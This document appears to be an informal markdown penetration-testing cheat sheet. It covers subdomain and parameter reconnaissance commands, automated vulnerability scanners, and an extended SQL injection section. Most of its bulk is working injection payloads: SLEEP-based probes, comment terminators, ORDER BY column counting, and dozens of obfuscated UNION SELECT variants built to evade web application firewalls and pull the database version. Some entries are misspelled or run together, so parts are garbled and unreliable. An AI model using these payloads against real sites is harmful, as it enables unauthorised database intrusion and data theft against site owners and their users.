## Summary

- [recon step 1 ](#recon)
- 
- [automatic scan](#automatic).
 --[sql scan  ](#SqlScan )




  ### recon
>tool subfinder automatic 
```
subfinder -d example.com >res.txt
```
> using gobuster for wordlists
```
gobuster dns -d example.com -w wordlits.txt
```
>next
> passive scan httpx

```
httpx -l res.txt -o res2.txt
```

> next step install tool 
* [subzy](https://github.com/PentestPad/subzy)
> next

```
subzy run --targets res2.txt > res3.txt

```

>scan parampeter
> old parameter ,1-gau 2-paramspider
* [gau](https://github.com/lc/gau)
```
cat res3.txt |gau |tee res4.txt
```
>next 
```
paramspider -l domains.txt
paramspider -d exam.com
```
> new parampeter
```
ffuf -u exam.com/FUZZ.php -w wordlist.txt

dirsearch -u exam.com 
```
> Bruteforce parameters
* [Sh1Yo/x8](https://github.com/Sh1Yo/x8) 

* Use wordlists of common parameters and send them, look for unexpected behavior from the backend. 
    ```ps1
    x8 -u "https://example.com/" -w <wordlist>
    

    x8 -u "https://example.com/" -X POST -w <wordlist>
    ```

> arjun
```  
arjun -d example.com
```
### the end 





### automatic
>tool all scan
```
nuclei -u example.com
```
>next
```
nmap -A -O example.com
```
> next
```
whatweb example.com
``` 
>next
```
searchsploit example
```
>next
```nikto -h example.com
```
> tool df list

# the end 


### SqlScan

>google dorking
```
site:exam.com id=
site:exam.com php?q=

```
> gf --list
```
cat url.txt|gf sqli | tee sql.txt
```
> web scan
```
https://pentest-tools.com/website-vulnerability-scanning/sql-injection-scanner-online
```
> error reuslt
```
' OR SLEEP(25)--
'
~`
///'
//'
////'
"
`
')
")
`)
'))
"))
`))
```
>balance url
```
--+-
--+
)--+-
))--+-
--
--+
)--
))--
-- -/*
/*
%23
%2323
;%00
%00
;%60
;%60
;%00
```
>next order by
```
ORDER BY 9
GROUP BY 9
order by 9
ORDER BY 1,2,3,4,5,6,7,8,9
/*!50000ORDER*/ 9
+ORDER BY/**_**/9
+/*!order/**/by*/1
+AND+MOD(52,12)+/*!50000GROUP*/+BY+100
+/*!50000GROUP*/+/*!50000BY*/+100
23%0AORDER%23%0ABY%23%0A100
+AND+MOD(29,9)+/*!50000ORDER/**_**/*/+/*!50000BY/**_**/*/+100
/*!50000BY/**_**/*/
+/*!12345ORDER*/+/*!12345BY*/100
+ORDER+BY+100+ASC
%2f**%2fORDER%2f**%2fBY%2f**%2f100
```
>next union
```
+un/**/ion+se/**/lect
union selcet
AND 0 ?NION SELECT
AND 0 %55NION %53ELET
AND 0 UNION SELECT null,null,null
AND+0+/*!50000%55NI\ON*/+/*!
50000%53ELE\CT/**_**/*/
%75nion %73elect
%23%0A/*!50000union/**_**/*/
%23%0AdistinctROW/**_**/
%23%0ASelect%23%0A
AND 0 UNION(SELECT(1),(2),(3),(4),(5),(6),(7),(8),(9))
+un/**/ion+se/**/lect
+UNION+ALL+SELECT
+AND+0+/*!50000%55niON*/+/*!50000%53eLeCt*/
/*!50000UNION/**_**/*/
+And .0UnIOn-- -%0ASeLe%43t
/*!%2f**%2funion%2f**%2fselect%2f**%2f
/*!12345#qa%0A#%0AUnIOn*/(/*!12345#qa%0A#%0ASeleCt*//**/1)
+AND+0+UNION/**/DISTINCTROW+SELECT
+AND+MOD(52,12)+/*!50000UNION/**_**/*/+/*!50000SELECT/**_**/*/
/**8**/and/**8**/0/**8**/UniOn/**8**/sEleCT/**8**/
+And/**/.0union/*%26*/distinctROW+select
+REVERSE(noinu)+REVERSE(tceles)
 /*!%55NiOn*/ /*!%53eLEct*/   %55nion(%53elect 1,2,3)-- -   +union+distinct+select+   +union+distinctROW+select+   /**//*!12345UNION SELECT*//**/   concat(0x223e,@@version)   concat(0x273e27,version(),0x3c212d2d)   concat(0x223e3c62723e,version(),0x3c696d67207372633d22)   concat(0x223e,@@version,0x3c696d67207372633d22)   concat(0x223e,0x3c62723e3c62723e3c62723e,@@version,0x3c696d67207372633d22,0x3c62723e)   concat(0x223e3c62723e,@@version,0x3a,”BlackRose”,0x3c696d67207372633d22)   concat(‘’,@@version,’’)   /**//*!50000UNION SELECT*//**/   /**/UNION/**//*!50000SELECT*//**/   /*!50000UniON SeLeCt*/   union /*!50000%53elect*/   +#uNiOn+#sEleCt   +#1q%0AuNiOn all#qa%0A#%0AsEleCt   /*!%55NiOn*/ /*!%53eLEct*/   /*!u%6eion*/ /*!se%6cect*/   +un/**/ion+se/**/lect   uni%0bon+se%0blect   %2f**%2funion%2f**%2fselect   union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A   REVERSE(noinu)+REVERSE(tceles)   /*--*/union/*--*/select/*--*/   union (/*!/**/ SeleCT */ 1,2,3)   /*!union*/+/*!select*/   union+/*!select*/   /**/union/**/select/**/   /**/uNIon/**/sEleCt/**/   /**//*!union*//**//*!select*//**/   /*!uNIOn*/ /*!SelECt*/   +union+distinct+select+   +union+distinctROW+select+   +UnIOn%0d%0aSeleCt%0d%0a   UNION/*&test=1*/SELECT/*&pwn=2*/   un?+un/**/ion+se/**/lect+   +UNunionION+SEselectLECT+   +uni%0bon+se%0blect+   %252f%252a*/union%252f%252a /select%252f%252a*/   /%2A%2A/union/%2A%2A/select/%2A%2A/   %2f**%2funion%2f**%2fselect%2f**%2f   union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A   /*!UnIoN*/SeLecT+
+and+(select 1)=(Select 0xAA[..(add about 1000 “A”)..])+/*!uNIOn*/+/*!SeLECt*/+1,2
 /*!u%6eion*/ /*!se%6cect*/ 1,2,3,4
-15+uni*on+sel*ect+1,2,3,4
+union+distinctROW+select+
/**//*!12345UNION SELECT*//**/
/**//*!50000UNION SELECT*//**/
/**/UNION/**//*!50000SELECT*//**/
/*!50000UniON SeLeCt*/
union /*!50000%53elect*/
+#uNiOn+#sEleCt
+#1q%0AuNiOn all#qa%0A#%0AsEleCt
/*!%55NiOn*/ /*!%53eLEct*/
/*!u%6eion*/ /*!se%6cect*/
+un/**/ion+se/**/lect
uni%0bon+se%0blect
%2f**%2funion%2f**%2fselect
union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A
REVERSE(noinu)+REVERSE(tceles)
/*--*/union/*--*/select/*--*/
union (/*!/**/ SeleCT */ 1,2,3)
/*!union*/+/*!select*/
union+/*!select*/
/**/union/**/select/**/
/**/uNIon/**/sEleCt/**/
+%2F**/+Union/*!select*/
/**//*!union*//**//*!select*//**/
/*!uNIOn*/ /*!SelECt*/
+union+distinct+select+
+union+distinctROW+select+
uNiOn aLl sElEcT
UNIunionON+SELselectECT
/**/union/*!50000select*//**/
0%a0union%a0select%09
%0Aunion%0Aselect%0A
%55nion/**/%53elect
uni<on all="" sel="">/*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/
%252f%252a*/UNION%252f%252a /SELECT%252f%252a*/
%0A%09UNION%0CSELECT%10NULL%
/*!union*//*--*//*!all*//*--*//*!select*/
union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1% 2C2%2C
/*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/
```




